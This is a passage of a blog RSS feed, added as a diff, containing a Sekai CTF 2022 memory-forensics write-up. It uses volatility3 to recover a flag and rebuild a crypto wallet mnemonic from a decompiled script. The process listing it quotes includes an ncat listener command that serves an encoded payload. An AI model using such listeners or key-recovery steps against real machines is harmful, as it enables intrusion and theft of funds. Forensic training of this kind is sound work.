@@ -1,0 +1,1067 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Stdor</title>
+        <description>Stdor&apos;s blog</description>
+        <link>https://stdor7314.github.io/</link>
+        <atom:link href="https://stdor7314.github.io/feed.xml" rel="self" type="application/rss+xml"/>
+        <pubDate>Sat, 12 Aug 2023 03:44:31 +0000</pubDate>
+        <lastBuildDate>Sat, 12 Aug 2023 03:44:31 +0000</lastBuildDate>
+        <generator>Jekyll v3.9.0</generator>
+        
+            <item>
+                <title>Sekai CTF 2022 : Symbolic Needs 1 &amp; 2</title>
+                <description>&lt;p&gt;A linux memory forensics challenge in two parts.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;symbolic-needs-1&quot;&gt;Symbolic Needs 1&lt;/h2&gt;
+
+&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2022-10-04-SekaiCTF2022-Symbolic-Needs-1-2/symbolic-needs-1.png&quot; alt=&quot;symbolic-needs-1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;We recently got hold of a cryptocurrency scammer and confiscated his laptop.&lt;/p&gt;
+
+  &lt;p&gt;Analyze the memdump. Submit the string you find wrapped with SEKAI{}.&lt;/p&gt;
+
+  &lt;p&gt;Attachment md5sum: 4be69c88e6f19dd9c9f8e6c52bc93c28&lt;/p&gt;
+
+  &lt;p&gt;Author: BattleMonger&lt;/p&gt;
+
+  &lt;p&gt;https://storage.googleapis.com/sekaictf/Forensics/memdump.zip&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Points: 467&lt;/li&gt;
+  &lt;li&gt;Solves: 24&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://drive.google.com/file/d/1l4PHepz1TbogHpAOxH356HxzlxTNuGqp/edit&quot;&gt;File Mirror&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;writeup&quot;&gt;Writeup&lt;/h3&gt;
+
+&lt;p&gt;Judging from the magic numbers, the provided file is a linux memory dump. We’ll use &lt;a href=&quot;https://github.com/volatilityfoundation/volatility3&quot;&gt;volatility3&lt;/a&gt; for analysis (for some reasons vol2 doesn’t support this particular OS / kernel). Before we can get volatility to work, we need to build a profile for the memory dump using some kernel debugging info. We can run this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 volatility3/vol.py &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; ./profile/ &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump.mem banner                           
+Volatility 3 Framework 2.4.0
+Progress:  100.00               PDB scanning finished                      
+Offset  Banner
+
+0x42400200      Linux version 5.15.0-43-generic &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buildd@lcy02-amd64-076&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gcc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 11.2.0-19ubuntu1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 11.2.0, GNU ld &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU Binutils &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.38&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#46-Ubuntu SMP Tue Jul 12 10:30:17 UTC 2022 (Ubuntu 5.15.0-43.46-generic 5.15.39)&lt;/span&gt;
+0x437c3718      Linux version 5.15.0-43-generic &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buildd@lcy02-amd64-076&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gcc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 11.2.0-19ubuntu1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 11.2.0, GNU ld &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU Binutils &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.38&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#46-Ubuntu SMP Tue Jul 12 10:30:17 UTC 2022 (Ubuntu 5.15.0-43.46-generic 5.15.39)9)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Great, so our memory dump is from Ubuntu, with kernel version &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5.15.0-43-generic&lt;/code&gt;. Let’s grab our debugging kernel at &lt;a href=&quot;http://ddebs.ubuntu.com/pool/main/l/linux/linux-image-unsigned-5.15.0-43-generic-dbgsym_5.15.0-43.46_amd64.ddeb&quot;&gt;http://ddebs.ubuntu.com/pool/main/l/linux/linux-image-unsigned-5.15.0-43-generic-dbgsym_5.15.0-43.46_amd64.ddeb&lt;/a&gt;, unzip it and run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dwarf2json&lt;/code&gt; to create our profile:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;profile
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dwarf2json linux &lt;span class=&quot;nt&quot;&gt;--elf&lt;/span&gt; usr/lib/debug/boot/vmlinux-5.15.0-43-generic &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ./profile/vmlinux-5.15.0-43-generic.json
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With our profile working let’s try some plugins:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 volatility3/vol.py &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; ./profile/ &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump.mem linux.bash.Bash
+Volatility 3 Framework 2.4.0
+
+PID Process Command Time Command
+
+1863	bash	2022-08-29 13:45:56.000000 	72.48.117.53.84.48.110.95.119.51.95.52.114.51.95.49.110.33.33.33
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks like ASCII codes. Decode it and we have the flag!&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;119&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;114&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;H0u5T0n_w3_4r3_1n!!!&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SEKAICTF{H0u5T0n_w3_4r3_1n!!!}&lt;/code&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;symbolic-needs-2&quot;&gt;Symbolic Needs 2&lt;/h2&gt;
+
+&lt;h3 id=&quot;description-1&quot;&gt;Description&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2022-10-04-SekaiCTF2022-Symbolic-Needs-1-2/symbolic-needs-2.png&quot; alt=&quot;symbolic-needs-2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Recover the private key of the wallet address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xACa5872e497F0Cc626d1E9bA28bAEC149315266e&lt;/code&gt;. Submit the key wrapped with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SEKAI{}&lt;/code&gt;.&lt;/p&gt;
+
+  &lt;p&gt;Attachment md5sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4be69c88e6f19dd9c9f8e6c52bc93c28&lt;/code&gt;&lt;/p&gt;
+
+  &lt;p&gt;Author: BattleMonger&lt;/p&gt;
+
+  &lt;p&gt;Hint: Stick to what you used for Part 1, you all are also missing a very basic but extremely useful command.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Points: 482&lt;/li&gt;
+  &lt;li&gt;Solves: 18&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;writeup-1&quot;&gt;Writeup&lt;/h3&gt;
+
+&lt;p&gt;We decided to run all plugins to see what’s left. My teammate found something interesting in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux.psaux.PsAux&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 volatility3/vol.py &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; ./profile/ &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump.mem linux.psaux.PsAux
+...
+1863	1845	bash	bash
+1878	1863	ncat	ncat &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 1234 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;N4GQ2CQAAAAAAEFG5JRPEAIAADRQAAAAAAAAAAAAAAAAAAAAAAAAACIAAAAEAAAAABZ6QAAAABSAAZABNQAFUAD2A5SQA2QBMQBBSAC2AJLQA3QLAEAACAABABSQGZADQMAQCADFASBQAAIALEAGOAC2AVSQMZAEMQCYGAUPBZNAOZIHUAEKCAFABGQQAWQFK4AGIAIEAACABAYDAEAG4CBRABZS65YBAEAACAABABMQAAIAMQDFUCTFBNSQVAYBMQDWIAMFAIMQAWQKMUGGKCVABVSQ4ZIKQMAWICDFBZSQVAYBMQEBMAAYAALQBIIBQMAVUCTHABNA6ZIQMQAGKDTFBKBQCZAIQMBUIAC5CRNBCZIPUAJGKBLFCNSQUZIRMUIWICAXACCQEGIAMQDYGATEAIMAAGIAUEAQCADRLFSQGZAJQMAQCADEAFJQAKIK5EAAAAAAJ3UQCAAAAB5BQVLTMFTWKORAFYXXOYLMNRSXIIDQMFZXG53POJSHUDLCNFYDGOLMNFZXILTUPB2NUALSNQKAAAAAABS6KHWNHGMBH4AWTJ3BE3XKCYFWPVQQSR6WWFSHC2WEUE3P5AP7G46OA3IBWAIA5EBAAAAA5EGAAAAA3ICVO4TPNZTSSFG2ANZXS462ARQXEZ3W3IEHAYLTON3W64TE3ICXA4TJNZ2NUBDFPBUXJWQFO5XXEZDT3ICG64DFN3NACZW2ARZGKYLE3IFHG4DMNF2GY2LOMVZ5UBDDN5SGLWQDMJUW5WQDON2HFWQFPJTGS3DM3IBWYZLO3IEG23TFNVXW42LD3ICXEYLOM5S5UALJ3IDGC4DQMVXGJWQDNFXHJKIAOINQAAAAOINQAAAA7IEHIZLTOQZC44DZ3IEDY3LPMR2WYZJ6AEAAAADTEIAAAAAIAABAEDQBAYAQQAIIAECAGDACBYARZ7YEAMIAGIQBAQBRIARGAEGAE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base32&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file.pyc
+1886	1147	update-notifier	update-notifier
+1911	1863	&lt;span class=&quot;nb&quot;&gt;sudo	sudo &lt;/span&gt;insmod LiME/src/lime-5.15.0-43-generic.ko &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dump.mem &lt;span class=&quot;nv&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lime
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That’s a python bytecode file and we can decompile it. Let’s try &lt;a href=&quot;https://github.com/zrax/pycdc&quot;&gt;pycdc&lt;/a&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cmake &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; 30 &lt;span class=&quot;c&quot;&gt;# build pycdc&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./pycdc ./file.pyc
+&lt;span class=&quot;c&quot;&gt;# Source Generated with Decompyle++&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# File: file.pyc (Python 3.10)&lt;/span&gt;
+
+Unsupported opcode: WITH_EXCEPT_START
+import sys
+&lt;span class=&quot;c&quot;&gt;# WARNING: Decompyle incomplete&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It failed. Python 3.10 is rather new and pycdc isn’t ready for it yet. So we did it in a hacky way: modify the source code in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASTree.cpp&lt;/code&gt; and force it to continue, instead of throwing errors:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* ASTree.cpp */&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Remove the return statements in default and insert a break ;) */&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pyc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SETUP_ANNOTATIONS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;variable_annotations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// fprintf(stderr, &quot;Unsupported opcode: %s\n&quot;, Pyc::OpcodeName(opcode &amp;amp; 0xFF));&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// cleanBuild = false;&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// return new ASTNodeList(defblock-&amp;gt;nodes());&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./pycdc ./file.pyc &amp;gt; test2.py&lt;/code&gt;, that’ll give us much more decompiled code. Not perfect, but almost!&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Source Generated with Decompyle++
+# File: file.pyc (Python 3.10)
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Usage: ./wallet password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;words&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;bip39list.txt&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;r&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x26F4036773F33FD1BC4E55616472CD7F65086B670B2DD5B84BB4D16F02730E734F72E500&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zfill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;mnemonic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;mnemonic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Wrong&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The program seems to be generating a passphrase from a code. If you look up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bip39&lt;/code&gt;, you’ll realize it’s a way to use a passphrase to store wallet address and private keys. Since we don’t have access to the wordlist &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bip39list.txt&lt;/code&gt; in the dump, we’ll assume the &lt;a href=&quot;https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt&quot;&gt;standard one&lt;/a&gt; is used. Let’s clean up the code and generate the passphrase:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;words&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
